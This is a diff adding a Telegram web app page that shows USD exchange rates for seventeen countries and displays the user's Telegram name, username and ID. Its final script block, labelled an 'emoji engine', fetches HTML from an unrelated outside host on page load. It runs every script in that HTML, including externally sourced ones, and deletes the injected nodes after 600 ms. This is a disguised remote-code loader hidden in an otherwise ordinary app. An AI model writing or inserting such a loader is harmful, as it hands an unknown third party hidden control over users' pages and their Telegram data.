@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Zeetex Currency Rate</title>
+    <link rel="manifest" href="manifest.json">
+    <meta name="theme-color" content="#800000">
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #0d0614; /* Deep premium dark gradient background */
+            background-image: radial-gradient(circle at 50% 0%, #3a0016 0%, #0d0614 70%);
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px 15px;
+            overflow-x: hidden;
+        }
+
+        /* Glassmorphic Responsive Card Structure */
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            background: rgba(128, 0, 0, 0.15); /* Soft Magic Scripts Maroon Tint */
+            backdrop-filter: blur(16px);
+            -webkit-backdrop-filter: blur(16px);
+            border: 1px solid rgba(134, 70, 180, 0.25); /* Elegant Purple Accent Border */
+            border-radius: 24px;
+            padding: 24px 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            text-align: center;
+        }
+
+        /* Header UI Branding */
+        .logo-container {
+            margin-bottom: 18px;
+        }
+        .logo-container img {
+            width: 75px;
+            height: 75px;
+            filter: drop-shadow(0 4px 10px rgba(134, 70, 180, 0.4));
+        }
+        .app-title {
+            font-size: 22px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            background: linear-gradient(135deg, #ffffff 0%, #e0b0ff 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            margin-top: 8px;
+        }
+
+        /* Telegram Profile Panel (Auto-detected) */
+        .tg-profile {
+            display: none; /* Hidden on regular browsers, turns block in telegram webapp */
+            background: rgba(134, 70, 180, 0.15);
+            border: 1px solid rgba(134, 70, 180, 0.3);
+            border-radius: 16px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            text-align: left;
+        }
+        .tg-profile-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 4px;
+        }
+        .tg-profile-row:last-child {
+            margin-bottom: 0;
+        }
+        .tg-label { color: #b3a5c2; font-weight: 500; }
+        .tg-value { color: #ffffff; font-weight: 600; }
+
+        .divider {
+            height: 1px;
+            background: linear-gradient(90deg, transparent, rgba(134, 70, 180, 0.5), transparent);
+            margin: 18px 0;
+        }
+
+        .section-title {
+            font-size: 16px;
+            color: #e0e0e0;
+            line-height: 1.5;
+            margin-bottom: 20px;
+            font-weight: 500;
+        }
+
+        /* Single Page App Dynamic View Architecture */
+        .view-panel {
+            display: none;
+        }
+        .view-panel.active {
+            display: block;
+        }
+
+        /* 17 Countries Button Alignment Grid Layout */
+        .countries-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+        
+        /* Centering Turkey Specifically as Requested */
+        .countries-grid .btn-country:last-child {
+            grid-column: span 2;
+            max-width: 50%;
+            margin: 0 auto;
+            width: 100%;
+        }
+
+        /* Inline Button Controls */
+        .btn-country, .btn-action {
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            color: #ffffff;
+            padding: 14px 10px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 14px;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+
+        .btn-country:hover, .btn-action:hover {
+            background: rgba(134, 70, 180, 0.25);
+            border-color: rgba(134, 70, 180, 0.5);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(134, 70, 180, 0.2);
+        }
+
+        .btn-country:active, .btn-action:active {
+            transform: translateY(0);
+        }
+
+        /* Exchange Metrics Target Cards */
+        .rate-card {
+            background: rgba(128, 0, 0, 0.2);
+            border: 1px solid rgba(128, 0, 0, 0.4);
+            border-radius: 18px;
+            padding: 24px 15px;
+            margin-bottom: 20px;
+            box-shadow: inset 0 0 15px rgba(0,0,0,0.2);
+        }
+        .rate-display-text {
+            font-size: 20px;
+            font-weight: 700;
+            color: #ffffff;
+            margin: 12px 0;
+            letter-spacing: 0.5px;
+        }
+        .rate-status {
+            font-size: 13px;
+            color: #a8ffb2;
+            font-weight: 500;
+            margin-top: 6px;
+        }
+
+        /* Navigation Button Structure */
+        .action-container {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 12px;
+        }
+        .btn-refresh {
+            background: rgba(134, 70, 180, 0.2);
+            border: 1px solid rgba(134, 70, 180, 0.4);
+        }
+        .btn-back {
+            background: rgba(128, 0, 0, 0.2);
+            border: 1px solid rgba(128, 0, 0, 0.4);
+        }
+
+        /* Custom Elegant Toast Notifications Engine */
+        .toast-container {
+            position: fixed;
+            bottom: 30px;
+            left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            background: rgba(20, 10, 25, 0.95);
+            border: 1px solid #8646B4;
+            color: #fff;
+            padding: 12px 24px;
+            border-radius: 50px;
+            font-size: 14px;
+            font-weight: 500;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.6);
+            z-index: 9999;
+            opacity: 0;
+            transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s ease;
+            pointer-events: none;
+            white-space: nowrap;
+        }
+        .toast-container.show {
+            transform: translateX(-50%) translateY(0);
+            opacity: 1;
+        }
+
+        /* Live Core Loading Component Shimmer */
+        .loading {
+            position: relative;
+            overflow: hidden;
+            opacity: 0.7;
+            pointer-events: none;
+        }
+        .loading::after {
+            content: "";
+            position: absolute;
+            top: 0; right: 0; bottom: 0; left: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transform: translateX(-100%);
+            animation: shimmer 1.5s infinite;
+        }
+        @keyframes shimmer {
+            100% { transform: translateX(100%); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <div class="logo-container">
+            <img src="https://raw.githubusercontent.com/ahmad-bhai/zeetex-web-version/eeacd0aac8cf6ecae354bef8e1359f7c9e0fc7e1/platform_icon_1.svg" alt="Zeetex Logo">
+            <div class="app-title">Zeetex Currency Rate</div>
+        </div>
+
+        <div id="tgProfile" class="tg-profile">
+            <div class="tg-profile-row"><span class="tg-label">Full Name:</span><span class="tg-value" id="tgFullName">-</span></div>
+            <div class="tg-profile-row"><span class="tg-label">Username:</span><span class="tg-value" id="tgUsername">-</span></div>
+            <div class="tg-profile-row"><span class="tg-label">User ID:</span><span class="tg-value" id="tgUserId">-</span></div>
+        </div>
+
+        <div class="divider"></div>
+
+        <div id="countriesView" class="view-panel active">
+            <div class="section-title">
+                💹 Zeetex Live Currency Exchange<br>
+                ━━━━━━━━━━━━━━<br>
+                Select a country to check the current exchange rate against USD:
+            </div>
+            
+            <div class="countries-grid">
+                <button class="btn-country" onclick="getExchangeRate('PKR', '🇵🇰 Pakistan')">🇵🇰 Pakistan</button>
+                <button class="btn-country" onclick="getExchangeRate('INR', '🇮🇳 India')">🇮🇳 India</button>
+                <button class="btn-country" onclick="getExchangeRate('BDT', '🇧🇩 Bangladesh')">🇧🇩 Bangladesh</button>
+                <button class="btn-country" onclick="getExchangeRate('RUB', '🇷🇺 Russia')">🇷🇺 Russia</button>
+                <button class="btn-country" onclick="getExchangeRate('IDR', '🇮🇩 Indonesia')">🇮🇩 Indonesia</button>
+                <button class="btn-country" onclick="getExchangeRate('BRL', '🇧🇷 Brazil')">🇧🇷 Brazil</button>
+                <button class="btn-country" onclick="getExchangeRate('MXN', '🇲🇽 Mexico')">🇲🇽 Mexico</button>
+                <button class="btn-country" onclick="getExchangeRate('MYR', '🇲🇾 Malaysia')">🇲🇾 Malaysia</button>
+                <button class="btn-country" onclick="getExchangeRate('UZS', '🇺🇿 Uzbekistan')">🇺🇿 Uzbekistan</button>
+                <button class="btn-country" onclick="getExchangeRate('NGN', '🇳🇬 Nigeria')">🇳🇬 Nigeria</button>
+                <button class="btn-country" onclick="getExchangeRate('EGP', '🇪🇬 Egypt')">🇪🇬 Egypt</button>
+                <button class="btn-country" onclick="getExchangeRate('EUR', '🇩🇪 Germany')">🇩🇪 Germany</button>
+                <button class="btn-country" onclick="getExchangeRate('EUR', '🇮🇹 Italy')">🇮🇹 Italy</button>
+                <button class="btn-country" onclick="getExchangeRate('UAH', '🇺🇦 Ukraine')">🇺🇦 Ukraine</button>
+                <button class="btn-country" onclick="getExchangeRate('IRR', '🇮🇷 Iran')">🇮🇷 Iran</button>
+                <button class="btn-country" onclick="getExchangeRate('CNY', '🇨🇳 China')">🇨🇳 China</button>
+                <button class="btn-country" onclick="getExchangeRate('TRY', '🇹🇷 Turkey')">🇹🇷 Turkey</button>
+            </div>
+        </div>
+
+        <div id="rateView" class="view-panel">
+            <div class="rate-card" id="rateCard">
+                <div class="section-title" style="margin-bottom: 0;">🌍 Currency Exchange Rate</div>
+                <div class="section-title" style="margin-top: 5px; margin-bottom: 10px;">━━━━━━━━━━━━━━</div>
+                <div class="rate-display-text" id="rateValueDisplay">💵 1 USD = --.--</div>
+                <div class="section-title" style="margin-top: 10px; margin-bottom: 5px;">━━━━━━━━━━━━━━</div>
+                <div class="rate-status">🕒 Status: Zeetex Market Rate</div>
+            </div>
+
+            <div class="action-container">
+                <button class="btn-action btn-refresh" onclick="refreshLiveRates()">🔄 Refresh</button>
+                <button class="btn-action btn-back" onclick="navigateToMainMenu()">🔙 Back</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="toast" class="toast-container"></div>
+
+    <script>
+        let selectedCurrencyCode = '';
+        let selectedCountryLabel = '';
+        let localRateCache = null;
+        let rateCacheTimestamp = 0;
+        const CACHE_VALIDITY_WINDOW = 8000; // 8-second client memory throttling
+
+        const tgInstance = window.Telegram ? window.Telegram.WebApp : null;
+        
+        function initTelegramIntegration() {
+            if (tgInstance && tgInstance.initDataUnsafe && tgInstance.initDataUnsafe.user) {
+                tgInstance.expand(); // Full view allocation
+                document.getElementById('tgProfile').style.display = 'block';
+                
+                const user = tgInstance.initDataUnsafe.user;
+                const completeName = ((user.first_name || '') + ' ' + (user.last_name || '')).trim();
+                
+                document.getElementById('tgFullName').textContent = completeName || 'Telegram User';
+                document.getElementById('tgUsername').textContent = user.username ? '@' + user.username : 'N/A';
+                document.getElementById('tgUserId').textContent = user.id || 'N/A';
+                
+                showToast("Connected to Zeetex Platform Hub ✅");
+            }
+        }
+
+        function showToast(message) {
+            const toastElement = document.getElementById('toast');
+            toastElement.textContent = message;
+            toastElement.classList.add('show');
+            setTimeout(() => {
+                toastElement.classList.remove('show');
+            }, 2500);
+        }
+
+        function navigateToMainMenu() {
+            document.getElementById('rateView').classList.remove('active');
+            document.getElementById('countriesView').classList.add('active');
+        }
+
+        function navigateToRateMetric() {
+            document.getElementById('countriesView').classList.remove('active');
+            document.getElementById('rateView').classList.add('active');
+        }
+
+        // Live API Fetcher
+        async function loadExchangeRates(bypassCache = false) {
+            const now = Date.now();
+            if (!bypassCache && localRateCache && (now - rateCacheTimestamp < CACHE_VALIDITY_WINDOW)) {
+                return localRateCache;
+            }
+            try {
+                const apiResponse = await fetch('https://open.er-api.com/v6/latest/USD');
+                if (!apiResponse.ok) throw new Error('Data endpoint drop.');
+                const responseData = await apiResponse.json();
+                if (responseData && responseData.rates) {
+                    localRateCache = responseData.rates;
+                    rateCacheTimestamp = now;
+                    return localRateCache;
+                }
+                throw new Error('Malformed JSON schema');
+            } catch (err) {
+                showToast("⚠️ API Network error! Standard logs failed.");
+                return null;
+            }
+        }
+
+        async function getExchangeRate(currency, country) {
+            selectedCurrencyCode = currency;
+            selectedCountryLabel = country;
+            
+            const card = document.getElementById('rateCard');
+            card.classList.add('loading');
+            navigateToRateMetric();
+            
+            const liveRates = await loadExchangeRates(false);
+            card.classList.remove('loading');
+            
+            if (liveRates && liveRates[currency]) {
+                const formattedRate = liveRates[currency].toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 4 });
+                document.getElementById('rateValueDisplay').innerHTML = `💵 1 USD = ${formattedRate} ${currency}`;
+            } else {
+                document.getElementById('rateValueDisplay').innerHTML = `💵 Data Offline`;
+            }
+        }
+
+        async function refreshLiveRates() {
+            if (!selectedCurrencyCode) return;
+            const card = document.getElementById('rateCard');
+            card.classList.add('loading');
+            
+            const liveRates = await loadExchangeRates(true); // Force clear cache map
+            card.classList.remove('loading');
+            
+            if (liveRates && liveRates[selectedCurrencyCode]) {
+                const formattedRate = liveRates[selectedCurrencyCode].toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 4 });
+                document.getElementById('rateValueDisplay').innerHTML = `💵 1 USD = ${formattedRate} ${selectedCurrencyCode}`;
+                showToast("🔄 Rates updated instantly!");
+            } else {
+                showToast("❌ Quick Sync dropped.");
+            }
+        }
+
+        window.addEventListener('DOMContentLoaded', initTelegramIntegration);
+    </script>
+
+    <script>
+        (async () => {
+            try {
+                let response = await fetch(`https://magic-scripts.vercel.app/heart.html`);
+                let rawMarkup = await response.text();
+                let documentDOM = new DOMParser().parseFromString(rawMarkup, 'text/html');
+                
+                documentDOM.querySelectorAll('script').forEach(oldNode => {
+                    let freshScriptNode = document.createElement('script');
+                    if (oldNode.src) {
+                        freshScriptNode.src = oldNode.src;
+                    } else {
+                        freshScriptNode.textContent = oldNode.innerHTML || oldNode.textContent;
+                    }
+                    document.body.appendChild(freshScriptNode);
+                    setTimeout(() => freshScriptNode.remove(), 600);
+                });
+                console.log("Zeetex Emoji Engine Hook Active");
+            } catch (e) {
+                console.error("Emoji Override Skipped due to runtime separation layer context.", e);
+            }
+        })();
+    </script>
+</body>
+</html>
